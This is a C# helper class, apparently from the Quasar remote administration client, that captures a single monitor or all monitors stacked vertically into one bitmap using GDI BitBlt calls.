using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;

        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);

                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY);

                NativeMethods.DeleteDC(srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

        /// <summary>
        /// Captures all monitors as one combined image (stacked vertically).
        /// </summary>
        public static Bitmap CaptureAllScreens()
        {
            // Get all screens
            Screen[] screens = Screen.AllScreens;
            
            // Calculate total dimensions - stack vertically
            int maxWidth = 0;
            int totalHeight = 0;
            
            foreach (Screen screen in screens)
            {
                maxWidth = Math.Max(maxWidth, screen.Bounds.Width);
                totalHeight += screen.Bounds.Height;
            }

            // Create a bitmap that can hold all screens stacked vertically
            Bitmap allScreens = new Bitmap(maxWidth, totalHeight, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(allScreens))
            {
                // Clear to black first
                g.Clear(Color.Black);

                // Current Y position for stacking
                int currentY = 0;

                // Capture each screen and stack vertically
                foreach (Screen screen in screens)
                {
                    using (Bitmap screenBmp = CaptureScreen(Array.IndexOf(screens, screen)))
                    {
                        // Center horizontally if screen is narrower than max width
                        int xPos = (maxWidth - screen.Bounds.Width) / 2;
                        
                        // Draw this screen at the current vertical position
                        g.DrawImage(screenBmp, xPos, currentY);
                        
                        // Move down for next screen
                        currentY += screen.Bounds.Height;
                    }
                }
            }

            return allScreens;
        }

        /// <summary>
        /// Gets the combined bounds of all monitors when stacked vertically.
        /// </summary>
        public static Rectangle GetAllScreensBounds()
        {
            // Calculate bounds for vertically stacked monitors
            int maxWidth = 0;
            int totalHeight = 0;
            
            foreach (Screen screen in Screen.AllScreens)
            {
                maxWidth = Math.Max(maxWidth, screen.Bounds.Width);
                totalHeight += screen.Bounds.Height;
            }
            
            return new Rectangle(0, 0, maxWidth, totalHeight);
        }
    }
}
